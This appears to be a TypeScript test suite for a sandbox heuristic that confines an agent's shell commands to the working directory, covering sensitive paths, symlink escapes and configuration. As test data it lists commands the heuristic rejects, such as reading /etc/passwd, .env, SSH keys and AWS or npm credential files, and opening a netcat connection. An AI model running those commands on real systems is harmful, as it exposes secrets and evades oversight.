            { desc: "trailing chain operator", command: "cat file.txt &&", expected: "allow:sandbox" },
            { desc: "only chain operators", command: "; ; ;", expected: undefined },
            { desc: "background operator", command: "cat file.txt &", expected: "allow:sandbox" },
            { desc: "background known command", command: "sleep 100 &", expected: "allow:sandbox" },
            { desc: "background unknown command", command: "nc host 80 &", expected: undefined },
            { desc: "second branch escapes cwd", command: "cat file.txt || cat /etc/passwd", expected: undefined },
        ]);
    });

    describe("sensitive paths", () => {
        runTests([
            { desc: ".env file", command: "cat .env", expected: undefined },
            { desc: ".env variant", command: "cat .env.local", expected: undefined },
            { desc: ".env in subdirectory", command: "cat src/.env", expected: undefined },
            { desc: ".env via parent traversal", command: "cat src/../.env", expected: undefined },
            { desc: ".git config", command: "cat .git/config", expected: undefined },
            { desc: ".git dir listing", command: "ls .git", expected: undefined },
            { desc: "ssh dir", command: "cat .ssh/config", expected: undefined },
            { desc: "aws dir", command: "ls .aws", expected: undefined },
            { desc: "npmrc", command: "cat .npmrc", expected: undefined },
            { desc: "netrc", command: "cat .netrc", expected: undefined },
            { desc: "private key by name", command: "cat id_rsa", expected: undefined },
            { desc: "private key by extension", command: "cat keys/server.pem", expected: undefined },
            { desc: "key extension", command: "cat tls.key", expected: undefined },
            { desc: "p12 bundle", command: "cat cert.p12", expected: undefined },
            { desc: "tfvars", command: "cat prod.tfvars", expected: undefined },
            { desc: "credentials file", command: "cat credentials", expected: undefined },
            { desc: "redirect into sensitive file", command: "echo x > .env", expected: undefined },
            { desc: "glob arg touching nothing sensitive", command: "cat src/*", expected: "allow:sandbox" },
            { desc: ".gitignore is not sensitive", command: "cat .gitignore", expected: "allow:sandbox" },
            { desc: ".github dir is not sensitive", command: "ls .github", expected: "allow:sandbox" },
            { desc: "regular config file is not sensitive", command: "cat config/database.yml", expected: "allow:sandbox" },
            { desc: "file containing 'key' is not sensitive", command: "cat monkey.txt", expected: "allow:sandbox" },
            {
                desc: "blockDotfiles rejects dotfiles",
                command: "cat .gitignore",
                config: { blockDotfiles: true },
                expected: undefined,
            },
            {
                desc: "blockDotfiles still allows regular files",
                command: "cat file.txt",
                config: { blockDotfiles: true },
                expected: "allow:sandbox",
            },
            {
                desc: "custom denyPaths pattern",
                command: "cat data/db.sqlite",
                config: { denyPaths: ["*.sqlite"] },
                expected: undefined,
            },
            {
                desc: "custom denyPaths pattern, unaffected file",
                command: "cat data/db.txt",
                config: { denyPaths: ["*.sqlite"] },
                expected: "allow:sandbox",
            },
            {
                desc: "grep pattern slot does not trigger sensitive check",
                command: "grep .env file.txt",
                expected: "allow:sandbox",
            },
        ]);
    });

    describe("symlink handling (real filesystem)", () => {
        let dir: string;
        let aliasDir: string;

        beforeAll(() => {
            dir = fs.mkdtempSync(path.join(os.tmpdir(), "pi-sandbox-heuristics-"));

            fs.mkdirSync(path.join(dir, "realdir"));
            fs.writeFileSync(path.join(dir, "realdir", "inside.txt"), "x");
            fs.writeFileSync(path.join(dir, "plain.txt"), "x");

            // link-inside.txt -> realdir/inside.txt (stays within cwd)
            fs.symlinkSync(path.join("realdir", "inside.txt"), path.join(dir, "link-inside.txt"));
            // link-outside.txt -> /etc/hostname (escapes cwd)
            fs.symlinkSync("/etc/hostname", path.join(dir, "link-outside.txt"));
            // chain: link-chain-src.txt -> link-chain.txt -> /etc/hostname
            fs.symlinkSync("/etc/hostname", path.join(dir, "link-chain.txt"));
            fs.symlinkSync("link-chain.txt", path.join(dir, "link-chain-src.txt"));
            // directory symlinks
            fs.symlinkSync("realdir", path.join(dir, "dirlink-inside"));
            fs.symlinkSync("/etc", path.join(dir, "dirlink-outside"));
            // symlink with innocent name pointing at sensitive file
            fs.writeFileSync(path.join(dir, ".env"), "SECRET=x");
            fs.symlinkSync(".env", path.join(dir, "env-link.txt"));
            // symlink with innocent name pointing at sensitive directory
            fs.mkdirSync(path.join(dir, ".ssh"));
            fs.writeFileSync(path.join(dir, ".ssh", "id_rsa"), "KEY");
            fs.symlinkSync(path.join(".ssh", "id_rsa"), path.join(dir, "notes.txt"));
            // symlink pointing at the working directory itself
            aliasDir = path.join(os.tmpdir(), `pi-sandbox-heuristics-alias-${path.basename(dir)}`);
            fs.symlinkSync(dir, aliasDir);

            // dangling symlink (target does not exist)
            fs.symlinkSync(path.join(dir, "nonexistent-target-xyz"), path.join(dir, "dangling.txt"));
        });

        afterAll(() => {
            fs.rmSync(dir, { recursive: true, force: true });
            fs.rmSync(aliasDir, { force: true });
        });

        const runFsTests = (tests: HeuristicTest[]) => {
            it.each(tests)("$desc", (test) => {
                expect(
                    getCwdConfinementPermission(test.command, dir, test.config ?? {}),
                ).toBe(test.expected);
            });
        };

        runFsTests([
            { desc: "symlink staying within cwd", command: "cat link-inside.txt", expected: "allow:sandbox" },
            { desc: "symlink escaping cwd", command: "cat link-outside.txt", expected: undefined },
            { desc: "symlink chain escaping cwd", command: "cat link-chain-src.txt", expected: undefined },
            { desc: "directory symlink within cwd", command: "ls dirlink-inside", expected: "allow:sandbox" },
            { desc: "cd through inside directory symlink", command: "cd dirlink-inside && cat inside.txt", expected: "allow:sandbox" },
            { desc: "pushd through inside directory symlink", command: "pushd dirlink-inside && popd && cat plain.txt", expected: "allow:sandbox" },
            { desc: "file through inside directory symlink", command: "cat dirlink-inside/inside.txt", expected: "allow:sandbox" },
            { desc: "directory symlink escaping cwd", command: "ls dirlink-outside", expected: undefined },
            { desc: "cd through outside directory symlink", command: "cd dirlink-outside && cat hostname", expected: undefined },
            { desc: "file through outside directory symlink", command: "cat dirlink-outside/hostname", expected: undefined },
            { desc: "dangling symlink read is rejected", command: "cat dangling.txt", expected: undefined },
            { desc: "dangling symlink write is rejected", command: "echo x > dangling.txt", expected: undefined },
            { desc: "plain file", command: "cat plain.txt", expected: "allow:sandbox" },
            { desc: "new write target in existing cwd", command: "echo x > newfile.txt", expected: "allow:sandbox" },
            { desc: "new write target in new subdirectory", command: "echo x > newdir/file.txt", expected: "allow:sandbox" },
            { desc: "find follows symlinks with -L: falls back", command: "find . -L -name foo", expected: undefined },
            { desc: "find without -L stays allowed", command: "find . -name foo", expected: "allow:sandbox" },
            { desc: "symlink hiding a sensitive file is rejected", command: "cat env-link.txt", expected: undefined },
            { desc: "symlink hiding a sensitive directory target is rejected", command: "cat notes.txt", expected: undefined },
            { desc: "grep -R follows traversal symlinks: falls back", command: "grep -R foo .", expected: undefined },
            { desc: "grep -r does not follow traversal symlinks: allowed", command: "grep -r foo .", expected: "allow:sandbox" },
            { desc: "du -L follows symlinks: falls back", command: "du -L .", expected: undefined },
            { desc: "tree -l follows symlinks: falls back", command: "tree -l", expected: undefined },
            {
                desc: "resolveSymlinks: false disables the realpath check",
                command: "cat link-outside.txt",
                config: { resolveSymlinks: false },
                expected: "allow:sandbox",
            },
        ]);

        it("cwd reached through a symlink still works", () => {
            expect(getCwdConfinementPermission("cat plain.txt", aliasDir, {})).toBe("allow:sandbox");
            expect(getCwdConfinementPermission("cat /etc/hostname", aliasDir, {})).toBe(undefined);
        });
    });

    describe("configuration", () => {
        runTests([
            {
                desc: "disabled heuristic falls back",
                command: "cat file.txt",
                config: { enabled: false },
                expected: undefined,
            },
            {
                desc: "custom permission",
                command: "cat file.txt",
                config: { permission: "allow" },
                expected: "allow",
            },
            {
                desc: "commands allowlist permits listed command",
                command: "ls src",
                config: { commands: ["ls"] },
                expected: "allow:sandbox",
            },
            {
                desc: "commands allowlist rejects other known commands",
                command: "cat file.txt",
                config: { commands: ["ls"] },
                expected: undefined,
            },
            {
                desc: "outside cwd still falls back with custom permission",
                command: "cat /etc/passwd",
                config: { permission: "allow" },
                expected: undefined,
            },
        ]);
    });
});
